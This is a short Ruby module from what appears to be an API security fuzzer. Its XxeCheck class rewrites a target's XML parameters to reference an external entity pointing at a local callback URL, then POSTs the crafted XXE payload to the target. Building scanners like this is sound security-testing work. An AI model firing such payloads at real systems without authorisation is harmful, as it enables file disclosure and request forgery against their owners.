require 'API_Fuzzer/vulnerability'
require 'API_Fuzzer/error'
require 'API_Fuzzer/request'
require 'byebug'

module API_Fuzzer
  class XxeCheck

    def self.scan(options = {})
      @url = options[:url] || nil
      @params = options[:params] || ''
      @scan_hash = options[:scan]
      fuzz_xml_params
    end

    def self.fuzz_xml_params
      return unless @params
      body = @params.gsub(/\>\s*[a-zA-Z0-9]*\s*\<\//, '>&xxe;<')
      payload = <<-XXEPAYLOAD
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:3000/yoxxe" >]>
      XXEPAYLOAD
      payload << body

      API_Fuzzer::Request.send_api_request(
        url: @url,
        params: payload,
        body: true,
        method: :post
      )
    end
  end
end
